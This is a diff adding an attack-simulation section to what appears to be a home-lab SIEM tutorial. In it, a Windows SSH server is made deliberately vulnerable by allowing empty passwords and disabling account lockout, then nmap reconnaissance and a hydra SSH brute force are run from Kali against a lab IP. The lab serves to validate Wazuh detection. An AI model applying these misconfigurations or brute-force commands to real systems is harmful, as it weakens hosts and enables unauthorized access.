@@ -64,3 +64,58 @@ Event id would be 4720
 Now we head to our discover tab on the wazuh server and type test in the search field
 ![Command](/images/image6.png)  
 Now you can see our logs are piping in to our wazuh sever.
+
+## 5. Phase 4 : Attack Simulation and Telemetry Validation.
+
+For attack on windows we are going to make our ssh server on windows vulnerble.So the attacker kali can exploit it and perform full cyber chain attack using AI (scripts) .
+To make it vulnerble first we open 
+```bash 
+C:\ProgramData\ssh\sshd_config
+```
+Remeber That you have ssh server and client on windows.  
+Open up the file and locate the following configs. Use ctrl+f to find these.
+```bash
+Match Group administrators
+    AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
+```
+Put a # in the start to comment them out  
+```bash
+PasswordAuthentication yes
+PermitEmptyPasswords yes
+
+# Match Group administrators
+   #  AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
+
+```
+Now configuration should look like above.  
+It is a A05:2021-Security Misconfiguration.(You can perform attacks like brute force.)  
+
+## Phase 4.1 : Pasive and Active Reconnaissance 
+
+Now we will be on our attacking kali (Laptop 2).. 
+First we check if our host is live 
+```bash 
+ping 192.168.100.75
+```
+![live](/images/pic7.png)  
+We can see our host is live. 
+Next we enumrate services and port using nmap.
+```bash
+sudo nmap -sS -sV -O 192.168.100.75
+```
+And we see our ssh service.
+![ssh](/images/image8.png)  
+Now we are going to perform a brute force attack using hydra 
+
+NOTE!  
+Before performing the brute force attack.Make sure that lockout threshold is 0.Otherwiese windows will be locked out after 5 attempts.
+```cmd
+net accounts /lockoutthreshold:0
+```
+Now perform the attack.
+```bash
+hydra -l victim -P /usr/share/wordlists/attacker_list 192.168.100.75 ssh -V
+```
+We can see our attack got successfull.We got the victim ssh password.
+![password](/images/image9.png)  
+
